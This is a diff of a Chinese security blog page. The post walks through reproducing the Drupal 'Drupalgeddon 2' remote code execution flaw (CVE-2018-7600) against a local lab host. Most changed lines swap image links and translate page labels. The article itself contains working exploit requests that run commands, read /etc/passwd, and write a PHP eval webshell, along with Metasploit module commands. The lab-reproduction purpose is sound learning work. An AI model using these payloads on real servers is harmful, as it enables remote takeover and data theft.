@@ -41,21 +41,21 @@
 <div class="side-navigate hide-area">
   
     <div class="item prev">
-      <a href="/2019/07/20/1 day/6/">
+      <a href="/2019/07/21/1 day/5/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        Drupal 小于7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）
+        nginx文件解析漏洞
       </div>
     </div>
   
   
     <div class="item next">
-      <a href="/2019/07/20/1 day/7/">
+      <a href="/2019/07/20/1 day/1/">
         <div class="item-icon"></div>
       </a>
       <div class="item-title">
-        DNS域传送漏洞
+        漏洞复现（CVE-2015-5254）
       </div>
     </div>
   
@@ -134,14 +134,23 @@
   <article id="post">
     <h1>Drupal Drupalgeddon 2远程代码执行漏洞CVE-2018-7600</h1>
     <p class="page-title-sub">
-      <span id="post-title-date">Created at 2019-07-20</span>
+      <span id="post-title-date">撰写于 2019-07-20</span>
       
-        <span id="post-title-updated">Updated at 2019-07-22</span>
+        <span id="post-title-updated">修改于 2019-08-05</span>
       
+      
+      <span id="post-title-categories">分类
+      
+      
+        
+        
+        <a href="/categories/漏洞复现/">漏洞复现</a>
+      
+      </span>
       
       
       <span id="post-title-tags">
-      Tag
+      标签
       
       
         
@@ -158,36 +167,36 @@
 <ol>
 <li>访问192.168.199.105:8080<br>环境启动后，一步一步的进行安装Drupal。<br>安装完成后再次访问<a href="http://192.168.199.105:8080/" target="_blank" rel="noopener">http://192.168.199.105:8080/</a><br>点击登录页面-创建新账户-头像上传中，存在远程代码执行的漏洞</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/73CA91F4D1A744FEBA5D884C099917E2/11974" alt><br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egMyxH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egMyxH.png" alt="egMyxH.png"></a><br>&emsp;<br>&emsp;</p>
 <ol start="2">
 <li>使用burp进行拦截抓包</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/9D908453820A4DC5A090DBDF8B10D913/11969" alt><br>发送到Repeater中，进行改成POST请求，并构造命令执行<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: 192.168.199.105:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 103</p>
+<p><a href="https://imgchr.com/i/egM2qI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egM2qI.png" alt="egM2qI.png"></a><br>发送到Repeater中，进行改成POST请求，并构造命令执行<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: 192.168.199.105:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 103</p>
 <p>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id</p>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/9528E5F9584145E192268A00277623BF/11972" alt><br>点击go</p>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/4E2E82E46912400A82F461238852EBC4/11966" alt><br>id即可爆出，成功<br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egQZFK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQZFK.png" alt="egQZFK.png"></a><br>点击go</p>
+<p><a href="https://imgchr.com/i/egMOZq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egMOZq.png" alt="egMOZq.png"></a><br>id即可爆出，成功<br>&emsp;<br>&emsp;</p>
 <ol start="3">
 <li>此外还可以通过Linux中的tee这个命令把命令执行结果输出到文件中<br>比如把/etc/passwd的命令结果输出到csy.txt文件中</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/58C1FE48CF824AAAA3EFEC370EC54A77/11962" alt><br>&emsp;<br><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/C51694B5F0F34C4082F842D977E50BF1/11960" alt><br>然后可直接在浏览器上访问这个文件即可查看到<br><a href="http://192.168.199.105:8080/csy.txt" target="_blank" rel="noopener">http://192.168.199.105:8080/csy.txt</a><br>&emsp;</p>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/C590D9A4B48A40E483BFF921E091938C/11973" alt></p>
+<p><a href="https://imgchr.com/i/egQQOA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQQOA.png" alt="egQQOA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/egQ8TP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQ8TP.png" alt="egQ8TP.png"></a><br>然后可直接在浏览器上访问这个文件即可查看到<br><a href="http://192.168.199.105:8080/csy.txt" target="_blank" rel="noopener">http://192.168.199.105:8080/csy.txt</a><br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egQtfS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQtfS.png" alt="egQtfS.png"></a></p>
 <ol start="4">
 <li>也可以利用此方式进行传个一句话木马<br>POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1<br>Host: 192.168.199.105:8080<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 150</li>
 </ol>
 <p>form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo “<?php @eval($_POST[nihao]);?>“ |tee lpp.php</p>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/C1F5518650D84141925D39565A242CA4/11968" alt><br>这里访问<a href="http://192.168.199.105:8080/lpp.php" target="_blank" rel="noopener">http://192.168.199.105:8080/lpp.php</a></p>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/609EFE52400841F1B16C72F63EA99D95/11971" alt><br>这里访问发现上传上去了，但是通过使用菜刀和蚁剑连接，发现并不成功，应该是并没有解析成功。<br>&emsp;<br>&emsp;</p>
+<p><a href="https://imgchr.com/i/egQDwq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQDwq.png" alt="egQDwq.png"></a><br>这里访问<a href="http://192.168.199.105:8080/lpp.php" target="_blank" rel="noopener">http://192.168.199.105:8080/lpp.php</a></p>
+<p><a href="https://imgchr.com/i/egQ6YT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQ6YT.png" alt="egQ6YT.png"></a><br>这里访问发现上传上去了，但是通过使用菜刀和蚁剑连接，发现并不成功，应该是并没有解析成功。<br>&emsp;<br>&emsp;</p>
 <ol start="5">
 <li>可以使用msf一把梭试一下<br>msfconsole<br>search drupal</li>
 </ol>
-<p><img src="https://note.youdao.com/yws/public/resource/1abcb332720468e1ae213fc090a35006/xmlnote/9E3C83E948D64775BD62C52D10C501E7/11967" alt><br>use exploit/unix/webapp/drupal_drupalgeddon2<br>options<br>set rhosts 192.168.199.105<br>set rport 8080<br>成功</p>
+<p><a href="https://imgchr.com/i/egQRl4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/05/egQRl4.png" alt="egQRl4.png"></a><br>use exploit/unix/webapp/drupal_drupalgeddon2<br>options<br>set rhosts 192.168.199.105<br>set rport 8080<br>成功</p>
 
   </article>
   <div class="random-toc-area">
-  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
-  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
   <div class="random-toc">
-    <h2>Table of Content</h2>
+    <h2>目录</h2>
     <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理："><span class="toc-text">漏洞原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现："><span class="toc-text">漏洞复现：</span></a></li></ol>
   </div>
 </div>
@@ -195,13 +204,13 @@
   
 <nav id="pagination">
   
-    <a href="/2019/07/20/1 day/6/" class="prev">&larr; Prev post Drupal 小于7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</a>
+    <a href="/2019/07/21/1 day/5/" class="prev">&larr; 上一篇 nginx文件解析漏洞</a>
   
 
   
 
   
-    <a href="/2019/07/20/1 day/7/" class="next">Next post DNS域传送漏洞 &rarr;</a>
+    <a href="/2019/07/20/1 day/1/" class="next">下一篇 漏洞复现（CVE-2015-5254） &rarr;</a>
   
 </nav>
 
